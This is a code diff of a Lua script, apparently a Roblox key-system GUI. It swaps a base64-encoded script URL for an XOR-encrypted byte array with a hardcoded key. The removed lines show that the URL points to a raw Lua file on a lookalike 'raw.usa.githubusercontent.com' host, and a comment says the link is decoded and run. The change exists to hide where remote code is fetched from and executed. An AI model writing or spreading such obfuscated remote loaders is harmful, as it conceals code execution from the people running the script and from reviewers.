@@ -29,30 +29,37 @@ if todayKeyTable then
     end
 end
 
--- Функция для декодирования base64
-local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local b64decode = function(data)
-    data = string.gsub(data, '[^'..b64chars..'=]', '')
-    return (data:gsub('.', function(x)
-        if x == '=' then return '' end
-        local r,f='',(b64chars:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d%d%d%d%d%d', function(x)
-        if #x ~= 8 then return '' end
-        local c=0
-        for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
+-- Функция XOR для расшифровки
+local function xorByte(a, b)
+    local res = 0
+    for i = 0, 7 do
+        local bitA = a % 2
+        local bitB = b % 2
+        local bitR = (bitA ~ bitB) & 1
+        res = res + bitR * 2^i
+        a = math.floor(a / 2)
+        b = math.floor(b / 2)
+    end
+    return res
 end
 
--- Обфусцированная base64 ссылка на скрипт
-local encodedScriptURL = "aHR0cHM6Ly9yYXcudXNhLmdpdGh1YnVzZXJjb250ZW50LmNvbS90aWVueGtoYW5oMS9zcGljeS9tYWluL0NoaWxsaS5sdWE="
+local function xorDecrypt(data, key)
+    local result = {}
+    for i = 1, #data do
+        local byte = data[i]
+        local keyByte = key:byte((i - 1) % #key + 1)
+        result[i] = string.char(xorByte(byte, keyByte))
+    end
+    return table.concat(result)
+end
 
--- Декодируем ссылку и запускаем
-local scriptURL = b64decode(encodedScriptURL)
+-- Зашифрованная ссылка
+local encryptedURL = {43,43,51,52,62,103,54,107,61,59,52,58,102,45,51,39,36,38,37,96,43,33,59,39,58,32,55,45,32,55,32,51,59,50,33,53,32,46,51,96,58,34,62,45,56,32,32,51,55,60,45,51,41,51,58,59,38,58,46,34,33,59,60,53,37,32,50,60,37,33,57,56,46,36,33,60,58,33,43,59,53,35,58,32,56,32,32,39,35,51,53,54,56,51,51,38,59,36,37,33,51,37,39,59}
+local key = "mySecretKey"
 
--- GUI (твой GUI код здесь)
+local scriptURL = xorDecrypt(encryptedURL, key)
+
+-- GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "PlayerokKeyGui"
 gui.ResetOnSpawn = false
